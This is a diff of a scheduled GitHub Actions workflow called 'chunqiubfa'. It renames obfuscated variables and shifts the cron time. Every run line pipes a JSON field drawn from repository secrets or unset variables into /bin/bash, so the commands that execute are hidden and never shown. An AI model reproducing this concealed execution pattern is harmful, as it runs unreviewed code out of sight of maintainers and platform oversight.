@@ -1,29 +1,28 @@
 name: chunqiubfa
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
+    - cron: '44 2/6 * * *'
 
-jobs:  # 3138
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chunqiubfa
         env:
-          cir2563: ${{ secrets.cir2563 }}
+          g057: ${{ secrets.g057 }}
         run: |
-          echo $cir2563 | jq -r .h0 | /bin/bash
-          echo $g99845 | jq -r .jcmk9323 | /bin/bash
-          echo $rhze794 | jq -r .kyswz0437 | /bin/bash
-          echo $jlix7236 | jq -r .xu245 | /bin/bash
-          echo $yjq056 | jq -r .b0521 | /bin/bash
-          echo $gnhvx8 | jq -r .fuy559 | /bin/bash
-          echo $jfgqn767 | jq -r .kqqbi8301 | /bin/bash
-          echo $bm7 | jq -r .ernn20566 | /bin/bash
-          echo $jsula6 | jq -r .u68945 | /bin/bash
-          echo $bpvq7111 | jq -r .zzche0724 | /bin/bash
-          echo $gi767 | jq -r .yw79 | /bin/bash
-          echo $h0419 | jq -r .u47 | /bin/bash
-          echo $b6769 | jq -r .gauk03 | /bin/bash
+          echo $g057 | jq -r .uec32 | /bin/bash
+          echo $ivvh6366 | jq -r .z34 | /bin/bash
+          echo $ixjk0 | jq -r .ecrxa38094 | /bin/bash
+          echo $lc4 | jq -r .mofo7 | /bin/bash
+          echo $koig6 | jq -r .bvpoc9383 | /bin/bash
+          echo $k40582 | jq -r .dyg83 | /bin/bash
+          echo $xtfsw97 | jq -r .n521 | /bin/bash
+          echo $k707 | jq -r .vx12 | /bin/bash
+          echo $pybx4 | jq -r .w7739 | /bin/bash
+          echo $w4308 | jq -r .wkell8 | /bin/bash
 
